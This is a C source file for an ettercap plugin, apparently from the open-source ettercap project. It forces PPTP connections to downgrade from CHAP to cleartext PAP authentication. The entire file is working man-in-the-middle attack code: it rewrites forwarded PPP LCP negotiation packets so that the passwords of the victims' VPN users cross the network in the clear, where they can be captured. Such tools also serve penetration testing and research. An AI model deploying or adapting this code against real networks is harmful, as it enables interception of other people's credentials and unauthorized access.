/*
    pptp_pap -- ettercap plugin -- Forces PAP during PPTP negotiation (it almost fails)

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>


struct ppp_lcp_header {
   u_char  code;
   u_char  ident;
   u_int16 length;
};

#define PPP_CONFIGURE_REQUEST   0x01
#define PPP_CONFIGURE_NAK       0x03
#define PPP_CONFIGURE_REJ       0x04
#define PPP_AUTH_REQUEST        0x03
#define PPP_REQUEST_PAP         0xc023
#define PPP_REQUEST_CHAP        0xc223
#define PPP_DUMMY_REQUEST       0xce23

/* protos */
int plugin_load(void *);
static int pptp_pap_init(void *);
static int pptp_pap_fini(void *);

static void parse_ppp(struct packet_object *po);
static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len);

/* plugin operations */
struct plugin_ops pptp_pap_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "pptp_pap",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "PPTP: Forces PAP authentication",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &pptp_pap_init,
   /* deactivation function */                     
   .fini =              &pptp_pap_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &pptp_pap_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int pptp_pap_init(void *dummy) 
{
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("pptp_pap: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }

   USER_MSG("pptp_pap: plugin running...\n");
   
   hook_add(HOOK_PACKET_LCP, &parse_ppp);
   return PLUGIN_RUNNING;   
}


static int pptp_pap_fini(void *dummy) 
{
   USER_MSG("pptp_pap: plugin terminated...\n");

   hook_del(HOOK_PACKET_LCP, &parse_ppp);
   return PLUGIN_FINISHED;
}

/*********************************************************/

/* Modify ConfigureRequest LCP packets */
static void parse_ppp(struct packet_object *po)
{
   struct ppp_lcp_header *lcp;
   u_int16 *option;
   char tmp[MAX_ASCII_ADDR_LEN];
   
   /* It is pointless to modify packets that won't be forwarded */
   if (!(po->flags & PO_FORWARDABLE)) 
      return; 

   /* PPP decoder placed lcp header in L4 structure.
    * According to the Hook Point this is an LCP packet.   
    */      
   lcp = (struct ppp_lcp_header *)po->L4.header;

   /* Catch only packets that have to be modified */      
   if ( lcp->code != PPP_CONFIGURE_REQUEST && lcp->code != PPP_CONFIGURE_NAK && lcp->code != PPP_CONFIGURE_REJ) 
      return;

   if ( (option=(u_int16 *)parse_option((u_char *)(lcp + 1), PPP_AUTH_REQUEST, ntohs(lcp->length) - sizeof(*lcp))) ==NULL) 
      return;
      
   if ( option[1] == htons(PPP_REQUEST_PAP) ) 
      return;

   /* Modify the negotiation */      
   if ( lcp->code == PPP_CONFIGURE_REJ && option[1] == htons(PPP_DUMMY_REQUEST) ) {
      /* We assume an original CHAP request that we have converted into DUMMY */
      option[1] = htons(PPP_REQUEST_CHAP);
   }
   else if (lcp->code == PPP_CONFIGURE_REQUEST)
      option[1] = htons(PPP_DUMMY_REQUEST);     
   else if (lcp->code == PPP_CONFIGURE_NAK) {
      option[1] = htons(PPP_REQUEST_PAP);

      if (!ip_addr_null(&po->L3.dst) && !ip_addr_null(&po->L3.src)) {
         USER_MSG("pptp_pap: Forced PPP clear text auth  %s -> ", ip_addr_ntoa(&po->L3.src, tmp));
         USER_MSG("%s\n", ip_addr_ntoa(&po->L3.dst, tmp));
      }
   }
}


/* Search an option in the packet */
static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len)
{
   /* Avoid never-ending parsing on bogus packets ;) */
   char counter=0;
   
   while (tot_len>0 && *buffer!=option && counter<20) {	
      tot_len -= buffer[1];
      buffer += buffer[1];
      counter++;
   }
   
   if (*buffer == option) 
      return buffer;
      
   return NULL;
}

/* EOF */

// vim:ts=3:expandtab
 
